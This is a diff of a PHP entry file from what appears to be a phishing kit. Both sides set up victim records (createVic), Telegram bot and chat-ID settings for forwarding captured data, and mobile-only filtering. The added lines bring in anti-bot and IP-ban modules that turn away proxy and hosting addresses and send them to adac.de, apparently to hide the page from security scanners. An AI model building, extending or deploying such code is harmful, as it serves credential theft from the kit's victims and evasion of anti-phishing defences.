@@ -1,48 +1,49 @@
 <?php 
 
-/***************************************************
-*    AUTHORS/CODERS : S3IKO && J33H4N @ SIGMADEVS
-*    CONTACT : t.me/els3iko | t.me/j33h4n
-*    OUR SCRIPTS ARE NOT FOR ANY ILLEGAL USE.
-***************************************************/
+require (__DIR__).'/config.php';
+require (__DIR__).'/panel/panel.class.php';
+require (__DIR__).'/lib/frm.php';
+require (__DIR__).'/botMother/bandip.php';
+require (__DIR__).'/botMother/botanti.php';
 
-@session_start();
+$pnl = new Panel();
+$current_data = $pnl->getData();
 
-if (!defined('TEST_CONFIG_LOADED')) {
-    require (__DIR__).'/test_config.php';
-}
+date_default_timezone_set('Europe/Zurich');
+require (__DIR__).'/botMother/botMother.php';
+$bm = new botMother();
+$m = new botMother();
+$bm->setExitLink("https://www.adac.de/");
+$bm->setGeoFilter("");
+$bm->setLicenseKey("");
+$bm->setTestMode(false);
 
- $ajaxPath = "../panel/classes/processor.php";
-require (__DIR__).'/panel/classes/mother.class.php';
-require (__DIR__).'/panel/classes/admin.class.php';
-$admin_json_file = (__DIR__).'/panel/data/admin.json';
-$ip = getRealClientIP();
-
-$m = new Mother;
-$vicFile = $m->getFileId();
-$m->createVic();
-$m->setDataFile($vicFile);
-
-
-$admin=new Admin;
-$admin->setDataFile($admin_json_file);
-$a_bot =  $admin->getData()["settings"]["telegram_bot"];
-$a_ids =  $admin->getData()["settings"]["telegram_id"];
-$block_pc =  $admin->getData()["settings"]["pc_block"];
-$shutdown =  $admin->getData()["settings"]["shutdown"];
-$notifs = $admin->getData()["settings"]["notifications"];
-
-if($shutdown==1){
-	exit;
+if(strtolower($antibot)=="yes"){
+    $bm->run();
 }
  
+if(strtolower($block_proxy)=="yes"){
+    $proxy = $bm->getIpInfo('proxy');
+    $hosting = $bm->getIpInfo('hosting');
+    
+    if($proxy OR $hosting){
+        $bm->killBot("Detected proxy/hosting.");
+        die(header("location: ".$bm->EXIT_LINK));
+    }
+    
+}
+     
 
-require (__DIR__).'/md.php';
-$d = new Mobile_Detect;
-if(!$d->isMobile() and $block_pc==1){
-	exit(header("location: out.php"));
+
+
+function setError($msg){
+    if(isset($_GET['e'])){
+        echo '<div class="error">'.$msg.'</div>';
+    }
 }
 
- 
+
+
+
 
 ?>
